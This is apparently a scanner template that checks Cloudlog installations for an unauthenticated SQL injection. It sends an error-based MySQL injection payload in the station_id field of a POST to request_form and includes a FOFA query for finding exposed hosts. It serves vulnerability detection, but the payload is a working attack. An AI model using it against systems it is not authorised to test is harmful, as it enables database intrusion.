http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "A Database Error Occurred", "{{md5({{num}})}}")
    - contains(content_type, "text/html")
    - status_code == 500
    type: dsl
  raw:
  - 'POST /index.php/oqrs/request_form HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,md5({{num}}),0x7162716b71,FLOOR(RAND(0)*2))x
    FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    '
id: cloudlog-system-sqli
info:
  author: s4e-io
  description: 'Unauthorised SQL injection vulnerability in the Cloudlog system interface
    request_form. In addition to being able to exploit the SQL injection vulnerability
    to obtain information from the database, unauthenticated remote attackers can
    also.

    '
  metadata:
    fofa-query: Login - Cloudlog
    max-request: 1
    verified: true
  name: Cloudlog System - SQL Injection
  reference:
  - https://github.com/wy876/POC/blob/main/Cloudlog/Cloudlog%E7%B3%BB%E7%BB%9Frequest_form%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: high
  tags: cloudlog,sqli,vuln
variables:
  num: '999999999'
